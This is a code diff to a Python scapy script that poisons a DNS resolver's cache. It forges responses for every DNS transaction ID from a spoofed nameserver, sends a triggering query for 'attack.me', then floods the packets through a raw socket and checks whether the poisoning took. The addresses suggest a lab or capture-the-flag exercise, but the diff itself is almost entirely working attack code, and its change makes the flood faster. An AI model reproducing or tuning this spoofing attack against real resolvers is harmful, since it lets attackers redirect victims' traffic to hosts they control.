@@ -1,4 +1,5 @@
-from scapy.all import DNS, IP, UDP, DNSRR, DNSQR, sendpfast, send, Ether, sendp, ICMP, sendpfast
+from scapy.all import *
+import time
 
 import os
 import requests
@@ -29,7 +30,7 @@ for txid in range(0, 65536):
             ttl=POISONED_RECORD_TTL,
             rdata=MALICOUS_ANSWER_IP)
     )
-    packets_to_send.append(Ether()/IP(src=SPOOF_NAMESERVER, dst=RESOLVER_IP)/UDP(dport=1337)/dns_layer)
+    packets_to_send.append(bytes(Ether()/IP(src=SPOOF_NAMESERVER, dst=RESOLVER_IP)/UDP(dport=1337)/dns_layer))
 
 random.shuffle(packets_to_send)
 print("[+] Finished Preparing Spoofed Packets")
@@ -38,9 +39,13 @@ print("[+] Creating Valid DNS Question")
 ping = Ether()/IP(src="10.13.37.6", dst="10.13.37.3")/UDP(sport=9999, dport=53)/DNS(rd=1, qd=DNSQR(qname="attack.me"))
 packets_to_send.insert(0, ping)
 
+s = conf.L2socket(iface="eth0")
+start = time.time()
 print("[+] Getting Ready to Send Spoofed Packets...")
-sendpfast(packets_to_send, iface="eth0")
-print("[+] All packets sent!")
+for f in packets_to_send:
+    s.send(f)
+end = time.time()
+print(f"[+] All packets sent! {end-start}")
 
 print("==Verification==")
 r = requests.get("http://attack.me", verify=False)
